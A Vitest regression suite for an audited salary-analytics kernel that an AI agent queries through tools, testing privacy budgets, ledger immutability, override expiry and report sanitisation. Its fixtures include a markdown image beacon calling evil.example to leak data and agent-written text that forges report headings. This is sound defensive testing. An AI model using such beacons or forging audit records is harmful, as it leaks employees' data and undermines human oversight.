import { describe, it, expect, beforeEach } from 'vitest';
import { Kernel } from '../kernel/kernel.js';
import { store } from '../app/store.js';
import { buildReport, reportToMarkdown } from '../app/report.js';
import { allToolDefs } from '../tools/tools.js';
import { replayScript, runStep } from '../replay/replay.js';
import { BUDGET_CELLS } from '../kernel/policy.js';
import { OVERRIDE_TTL_MS } from '../app/store.js';

/**
 * Regressions for defects found in an adversarial review of the finished build.
 *
 * Each test below corresponds to a real flaw that shipped in an earlier revision. They are kept
 * separate from the attack suite so the history stays legible: these are not hypothetical
 * attacks, they are bugs that existed.
 */

beforeEach(() => {
  store.reset();
});

const signal = new AbortController().signal;

describe('R1 — replay must drive the real tool handlers', () => {
  /**
   * The most damaging finding, because it was the one claim a judge could verify. Replay reached
   * into `store.kernel` while the docs said it called `execute`, and one step returned a
   * hand-written literal instead of building a report.
   */
  it('references only tools that exist', () => {
    const names = new Set(allToolDefs.map((t) => t.name));
    for (const step of replayScript) {
      expect(names.has(step.tool), `replay references unknown tool ${step.tool}`).toBe(true);
    }
  });

  it('routes every step through a tool handler, so the ledger reflects real calls', async () => {
    for (const step of replayScript.slice(0, 4)) await runStep(step);

    const ledger = store.kernel.getLedger();
    expect(ledger.length).toBeGreaterThan(0);

    // Going through `execute` means `traced()` ran, which is what populates the inspector.
    expect(store.lastToolReturn).not.toBeNull();
    expect(allToolDefs.some((t) => t.name === store.lastToolReturn!.tool)).toBe(true);
  });

  it('fabricates no response: the report step really builds a report', async () => {
    const reportStep = replayScript.find((s) => s.tool === 'get_audit_report');
    expect(reportStep).toBeDefined();

    await runStep(replayScript[0]!);
    await runStep(reportStep!);

    const out = store.lastToolReturn!.output as { policy?: unknown; ledger?: unknown };
    // A real report carries the policy and the ledger. The old hardcoded literal had neither.
    expect(out.policy).toBeDefined();
    expect(out.ledger).toBeDefined();
  });

  it('ends on refusals', async () => {
    for (const step of replayScript) await runStep(step);
    const refused = store.kernel.getLedger().filter((e) => e.outcome === 'refused');
    expect(refused.length).toBeGreaterThanOrEqual(2);
  });
});

describe('R2 — the ledger must be immutable to callers', () => {
  it('cannot be truncated through the accessor', () => {
    store.loadDataset();
    store.kernel.aggregate({ stat: 'count' });
    const before = store.kernel.getLedger().length;
    expect(before).toBeGreaterThan(0);

    // Previously this emptied the real audit trail, because the accessor handed out the live
    // internal array.
    const handle = store.kernel.getLedger() as unknown as unknown[];
    handle.length = 0;

    expect(store.kernel.getLedger().length).toBe(before);
  });

  it('cannot be rewritten entry by entry', () => {
    store.loadDataset();
    store.kernel.aggregate({ stat: 'max', metric: 'baseSalary' });
    const copy = store.kernel.getLedger();
    (copy[0] as { outcome: string }).outcome = 'ok';
    (copy[0]!.spec as Record<string, unknown>).stat = 'forged';

    const fresh = store.kernel.getLedger();
    expect(fresh[0]!.spec.stat).not.toBe('forged');
  });
});

describe('R3 — the budget must bound, not merely trigger', () => {
  it('refuses a query that would overrun rather than allowing it through', () => {
    const k = new Kernel(4);
    k.loadSample();
    // A grouped query over level x fn releases far more than four cells.
    const r = k.aggregate({ stat: 'mean', metric: 'baseSalary', groupBy: ['level', 'fn'] });
    expect(r.status).toBe('refused');
    expect((r as { code: string }).code).toBe('BUDGET_INSUFFICIENT');
    expect(k.remaining).toBeLessThanOrEqual(4);
  });

  it('never lets spending exceed the total', () => {
    const k = new Kernel(60);
    k.loadSample();
    for (let i = 0; i < 30; i++) {
      k.aggregate({ stat: 'mean', metric: 'baseSalary', groupBy: ['level', 'gender'] });
    }
    expect(k.remaining).toBeGreaterThanOrEqual(0);
    expect(BUDGET_CELLS - k.remaining).toBeLessThanOrEqual(BUDGET_CELLS);
  });
});

describe('R4 — stratified figures must not become single-cohort disclosures', () => {
  /**
   * `adjustedGap` counted only `controlFor` against the depth cap, so dimension plus two controls
   * built depth-3 cohorts. Configurations existed where exactly one stratum was usable, releasing
   * that stratum's bare ratio at a depth `aggregate` forbids.
   */
  it('withholds a group whose figure rests on too few strata', () => {
    const k = new Kernel(Number.MAX_SAFE_INTEGER);
    k.loadSample();
    const r = k.adjustedGap({
      metric: 'baseSalary',
      dimension: 'location',
      reference: 'London',
      controlFor: ['level', 'fn']
    });
    expect(r.status).toBe('ok');
    const results = (r as { results: { gapPct: number | null; withheld?: true }[] }).results;

    // Any group that did report must have rested on enough strata to be an aggregate of
    // aggregates rather than one cohort in disguise.
    for (const row of results) {
      if (row.gapPct !== null) expect(row.withheld).toBeUndefined();
      else expect(row.withheld).toBe(true);
    }
  });

  it('charges for withheld groups, closing the free oracle', () => {
    const k = new Kernel(Number.MAX_SAFE_INTEGER);
    k.loadSample();
    const before = k.remaining;
    k.adjustedGap({
      metric: 'baseSalary',
      dimension: 'location',
      reference: 'London',
      controlFor: ['level', 'fn']
    });
    // Previously a fully-withheld result cost nothing, so the floor structure of depth-3 cohorts
    // could be mapped exactly with unlimited free calls.
    expect(k.remaining).toBeLessThan(before);
  });

  it('does not weight by headcount, which leaked exact cohort sizes', () => {
    // Headcount weighting made the released figure a linear equation over the unknown headcount
    // vector; sweeping `reference` produced independent equations and recovered the counts that
    // banding hides. Equal per-stratum weighting removes the channel.
    const src = allToolDefs.find((t) => t.name === 'adjusted_pay_gap');
    expect(src).toBeDefined();
    const k = new Kernel(Number.MAX_SAFE_INTEGER);
    k.loadSample();
    const out = JSON.stringify(
      k.adjustedGap({
        metric: 'baseSalary',
        dimension: 'gender',
        reference: 'Male',
        controlFor: ['level', 'fn']
      })
    );
    expect(out).not.toMatch(/"weight"/);
    expect(out).not.toMatch(/"headcount"/);
  });
});

describe('R5 — the exported report must not be forgeable by its subject', () => {
  it('neutralises headings in agent-authored text', () => {
    store.loadDataset();
    store.addFinding({
      title: 'Normal title',
      detail: '## Full disclosure ledger\n\nRecords released: 9999\n\n> forged',
      severity: 'info',
      basedOn: null
    });
    const md = reportToMarkdown(buildReport(store));

    // Exactly one real ledger section.
    expect(md.match(/^## Full disclosure ledger$/gm)?.length ?? 0).toBe(1);
  });

  it('strips images and links, which are exfiltration beacons', () => {
    store.loadDataset();
    store.addFinding({
      title: 'x',
      detail: '![beacon](https://evil.example/p?d=leak) and [link](https://evil.example)',
      severity: 'info',
      basedOn: null
    });
    const md = reportToMarkdown(buildReport(store));
    expect(md).not.toMatch(/!\[/);
    expect(md).not.toMatch(/\]\(http/);
  });

  it('defuses fenced blocks so the rest of the document cannot be swallowed', () => {
    store.loadDataset();
    store.addFinding({
      title: 'x',
      detail: '```\neverything after this would vanish',
      severity: 'info',
      basedOn: null
    });
    const md = reportToMarkdown(buildReport(store));
    // The real ledger fence must still close correctly at the end of the document.
    expect(md.trimEnd().endsWith('```')).toBe(true);
  });
});

describe('R6 — the report must count every disclosing operation', () => {
  it('includes stratified queries in questions asked', () => {
    store.loadDataset();
    store.kernel.adjustedGap({
      metric: 'baseSalary',
      dimension: 'gender',
      reference: 'Male',
      controlFor: ['level']
    });
    // Filtering the ledger on `op === 'aggregate'` reported zero here.
    expect(buildReport(store).disclosure.questionsAsked).toBeGreaterThan(0);
  });
});

describe('R7 — the budget display must track the kernel', () => {
  it('never reports negative spend after an extension', () => {
    store.loadDataset();
    store.kernel.aggregate({ stat: 'count' });
    store.kernel.extendBudget(200);
    store.notify();

    const s = store.snapshot();
    const spent = s.budgetTotal - s.budget.remaining;
    expect(spent).toBeGreaterThanOrEqual(0);
    expect(s.budgetTotal).toBeGreaterThan(BUDGET_CELLS);
  });
});

describe('R8 — override requests must not stay open indefinitely', () => {
  it('expires after the TTL', () => {
    store.loadDataset();
    const req = store.openOverride(
      { metric: 'baseSalary', stat: 'mean', groupBy: ['level', 'location'] },
      'justification'
    );
    expect(req.status).toBe('pending');

    store.expireStaleOverrides(Date.parse(req.at) + OVERRIDE_TTL_MS + 1);
    expect(store.findOverride(req.id)!.status).toBe('expired');
  });

  it('cannot be approved once expired', () => {
    store.loadDataset();
    const req = store.openOverride(
      { metric: 'baseSalary', stat: 'mean', groupBy: ['level'] },
      'x'
    );
    store.expireStaleOverrides(Date.parse(req.at) + OVERRIDE_TTL_MS + 1);
    expect(store.resolveOverride(req.id, 'approved')).toBeNull();
    expect(store.findOverride(req.id)!.result).toBeUndefined();
  });

  it('stops an expired request keeping the polling tool registered', () => {
    store.loadDataset();
    const req = store.openOverride(
      { metric: 'baseSalary', stat: 'mean', groupBy: ['level'] },
      'x'
    );
    store.expireStaleOverrides(Date.parse(req.at) + OVERRIDE_TTL_MS + 1);
    // A pending request is what gates registration of check_override_request; an expired one
    // must not count.
    expect(store.overrides.some((o) => o.status === 'pending')).toBe(false);
  });

  it('leaves a fresh request alone', () => {
    store.loadDataset();
    const req = store.openOverride(
      { metric: 'baseSalary', stat: 'mean', groupBy: ['level'] },
      'x'
    );
    store.expireStaleOverrides(Date.parse(req.at) + 1000);
    expect(store.findOverride(req.id)!.status).toBe('pending');
  });
});
